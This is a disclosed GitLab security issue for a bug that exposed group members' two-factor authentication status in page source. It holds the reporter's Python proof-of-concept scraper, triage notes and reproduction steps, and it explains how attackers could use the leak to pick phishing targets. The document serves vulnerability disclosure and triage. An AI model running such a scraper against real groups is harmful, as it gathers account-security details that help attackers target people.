=== Content from gitlab.com_8ff879a5_20250115_082808.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2022](/gitlab-org/cves/-/tree/master/2022)
* [**CVE-2022-1963.json**](/gitlab-org/cves/-/blob/master/2022/CVE-2022-1963.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2022/CVE-2022-1963.json)
[Permalink](/gitlab-org/cves/-/blob/5dbfc725a86e6d942deec9c36b7f06f5b8d912fc/2022/CVE-2022-1963.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![ü§ñ GitLab Bot ü§ñ's avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 "ü§ñ GitLab Bot ü§ñ")](/gitlab-bot)

  Jul 01, 2022

  [e7aabee4](/gitlab-org/cves/-/commit/e7aabee49cb2fb513457874f156599fc3b04e952)
  [Publishing 0 updated advisories and 2 new advisories](/gitlab-org/cves/-/commit/e7aabee49cb2fb513457874f156599fc3b04e952)
  ¬∑
  e7aabee4

  [ü§ñ GitLab Bot ü§ñ](/gitlab-bot) authored Jul 01, 2022

  e7aabee4

  [Publishing 0 updated advisories and 2 new advisories](/gitlab-org/cves/-/commit/e7aabee49cb2fb513457874f156599fc3b04e952)
  [ü§ñ GitLab Bot ü§ñ](/gitlab-bot) authored Jul 01, 2022

Loading



=== Content from gitlab.com_dec7265e_20250115_082809.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# 2FA status of the members of groups/projects are leaked through the source code

**[HackerOne report #1470023](https://hackerone.com/reports/1470023)** by `albatraoz` on 2022-02-03, assigned to [@nmalcolm](/nmalcolm "Nick Malcolm"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Original Report

##### Summary

2FA status of the users is a confidential information and should be only visible to peopler that the user allows to. According to the group [permissions](https://docs.gitlab.com/ee/user/permissions.html) the 2FA status of the members of a group/project should be only visible to the owners/maintainers of the groups/projects & only they should be able to filter members on the basis of it. But the source code of the members list page is leaking the 2FA status of all the users.

Click here to view
##### Steps to reproduce

I've created a simple python script for easy reproduction:

1. Install dependencies

```
pip3 install beautifulsoup4
```

2. Create a python file with the following code

```
from bs4 import BeautifulSoup
import requests
import sys
import json
group_name = sys.argv[1]
res = requests.get(f"https://gitlab.com/groups/{group_name}/-/group_members")
data = res.content
soup = BeautifulSoup(data, 'html.parser')
div = soup.find("div", {"class": "js-group-members-list-app"})
res = json.loads(div["data-members-data"])
for member in res["user"]["members"]:
	print(f'Username: {member["user"]["username"]}, 2FA Enabled: {member["user"]["two_factor_enabled"]}')
```

3. Run the python script with the group name for which you want to expose the 2FA status of.

   I've created a group for testing called 2fa\_check, you can use it too.

```
python3 get_2fa_status.py 2fa2
```

4. You would see the 2FA status of the members of the group being printed.

[![Screenshot_from_2022-02-04_00-04-49.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/2e4451b497723ffdd02208545c4110d753facf1b/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f64393832656534652d656238642d343162302d396664352d6136613530373030363862302f53637265656e73686f745f66726f6d5f323032322d30322d30345f30302d30342d34392e706e67)

You can check the same group as you are not member of the group but still you will get the results.

#### Impact

Two factor authentication is a confidential security related PII data of the members which should not be accessible to the anyone except the owners/maintainers of projects/groups. An attacker would be able to retrieve this information easily using this vulnerability.

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [Screenshot\_from\_2022-02-04\_00-04-49.png](https://h1.sec.gitlab.net/a/d982ee4e-eb8d-41b0-9fd5-a6a5070068b0/Screenshot_from_2022-02-04_00-04-49.png)
* [get\_2fa\_status.py](https://h1.sec.gitlab.net/a/9610d115-e14b-44a6-b86d-28b4ad85fc48/get_2fa_status.py)
## How To Reproduce

1. Open browser of choice's Developer Tools (or use cURL)
2. As a logged out user, open any Group Members page for a public group.
   1. N.b. also works for logged in users looking at any Group you're a member of, or as a logged in user looking at public groups that you're not a member of
3. Scroll through the server-provided response and look for a `div` with the class `js-group-members-list-app` (not the browser-rendered response)
4. View html encoded user deetz, incl. MFA status

In the below example, you see a signed out view of a public group, disclosing MFA status.

[![Screen_Shot_2022-02-08_at_3.58.03_PM](data:image/gif;base64...)](/-/project/278964/uploads/596226ac6c6ebe5aab59723d1c129bf2/Screen_Shot_2022-02-08_at_3.58.03_PM.png)

### TODO / Other vulnerable endpoints

‚úÖ The Group Members API seems fine:

```
[{"id":24,"username":"victim","name":"Vic Tim","state":"active","avatar_url":"https://www.gravatar.com/avatar/cde15812b77a38321e6696050acb6d2c?s=80\u0026d=identicon","web_url":"http://gdk.test:3000/victim","access_level":50,"created_at":"2022-02-08T02:28:04.698Z","expires_at":null,"membership_state":"active"},{"id":8,"username":"jeff_collins","name":"Annita Weimann","state":"active","avatar_url":"https://www.gravatar.com/avatar/426f608516a49b9c7d5c78abc659c9cb?s=80\u0026d=identicon","web_url":"http://gdk.test:3000/jeff_collins","access_level":10,"created_at":"2022-02-08T02:46:20.063Z","expires_at":null,"membership_state":"active"},{"id":22,"username":"nm","name":"Nick Malcolm","state":"active","avatar_url":"http://gdk.test:3000/uploads/-/system/user/avatar/22/avatar.png","web_url":"http://gdk.test:3000/nm","access_level":10,"created_at":"2022-02-08T02:46:20.221Z","expires_at":null,"membership_state":"active"}]
```

‚ùì GraphQL API

‚ùì Projects Members page

‚ùì What else?

### Why is this happening?

I ([@nmalcolm](/nmalcolm "Nick Malcolm")) think it's because the UI shows badges to owners/maintainers, but the page response is returning it to everyone. E.g. here's the AppSec team:

[![Screen_Shot_2022-02-08_at_4.02.32_PM](data:image/gif;base64...)](/-/project/278964/uploads/bc3f3e567266c480a9cbefba7cc885d0/Screen_Shot_2022-02-08_at_4.02.32_PM.png)

### Why is this bad?

Well, we say we only show this status to a certain Role, so it's at least a documentation update if intentional.

But as an attacker, being able to see which users (e.g. of a popular open source project) has MFA disabled means I know who to target in a phishing attack. Or if I have a list of breached passwords, I can more easily know which accounts to skip because MFA is protecting them.

Edited Feb 08, 2022 by [Nick Malcolm](/nmalcolm)

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


